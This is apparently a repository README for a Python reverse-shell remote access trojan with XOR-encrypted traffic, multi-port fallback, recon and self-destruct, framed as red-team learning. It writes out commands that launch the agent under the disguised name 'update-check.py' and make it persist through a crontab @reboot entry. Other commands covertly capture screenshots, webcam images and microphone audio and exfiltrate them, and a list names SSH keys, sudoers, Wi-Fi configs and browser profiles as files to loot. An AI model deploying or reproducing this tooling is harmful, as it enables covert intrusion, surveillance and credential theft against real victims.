
# 🐍 Advanced Reverse Shell RAT (Multi-port, XOR, Recon, Persistence)

## 📘 Learning Path Progression

1. 🛠️ Socket Shell Basics
2. 🔁 Bind & Reverse Hybrid Shells
3. 🔐 XOR Encrypted Communication
4. 📥 File Download (`get`)
5. 📜 Multiline Response Handling
6. 🎯 Recon Command (System Looting)
7. 🔁 Crontab Persistence
8. 👻 Process Renaming
9. 🔥 Multi-Port Reverse Shell
10. 💣 Self-Destruct Feature

---

## 🚀 Features

- Reverse shell using XOR encryption over multiple ports (443, 53, 8080)
- Executes shell commands with multi-line response support
- Supports `get <file>` for file exfiltration
- `recon`: automated data collection on victim
- `selfdestruct`: safely removes agent
- Optional: Process title masking (e.g., `dbus-daemon`)
- Persistence using `crontab`

---

## 🔄 Usage Instructions

### On Kali (Controller)
```bash
python3 listener_xor.py
```

> Listens on ports 443, 53, and 8080 for incoming reverse shells.

### On Ubuntu (Victim)

Edit `agent_reverse.py` and update:
```python
CONTROLLER_IP = "192.168.56.10"  # your Kali IP
```

Run in background:
```bash
pkill -f agent.py
nohup python3 ~/.config/update-check.py &>/dev/null &
```

Enable persistence:
```bash
(crontab -l 2>/dev/null; echo "@reboot nohup python3 ~/.config/update-check.py &") | crontab -
```

---

## 🎮 Cool Commands to Run

### 📷 Screenshot
```bash
scrot /tmp/screen.png && sleep 1 && get /tmp/screen.png
```

### 📸 Webcam
```bash
fswebcam /tmp/webcam.jpg && sleep 1 && get /tmp/webcam.jpg
```

### 🎤 Microphone
```bash
arecord -f cd -d 10 /tmp/audio.wav && get /tmp/audio.wav
```

### 🧠 Recon Command
```bash
recon
```

### 💣 Self-Destruct
```bash
selfdestruct
```

Deletes the agent script from disk.

---

## 📂 Valuable Files to Loot

- `/etc/passwd`, `/etc/group`, `/etc/sudoers`
- `~/.ssh/id_rsa`, `~/.bash_history`
- `/etc/NetworkManager/system-connections/*`
- `.env`, `config.json`, `.git`, browser profiles

---

## 🛡️ Security Score

| Category        | Score | Notes |
|-----------------|-------|-------|
| Stealth         | 7/10  | XOR, multi-port, process rename |
| Resilience      | 8/10  | Crontab + port fallback |
| Detection Risk  | 5/10  | Reverse shell visible to firewalls |
| Educational Use | 🔟     | Ideal for real-world red team skills |

---

## ⚠️ Legal Disclaimer

This tool is for educational and authorized use only.
**Do not deploy** on systems you do not own or have written permission to test.

---

Built to learn. Built to bypass. Built to improve. 🧙🏽‍♂️

mkdir -p ~/.config
cp reverse_shell_againt.py ~/.config/update-check.py
(crontab -l 2>/dev/null; echo "@reboot python3 ~/.config/update-check.py &") | crontab -
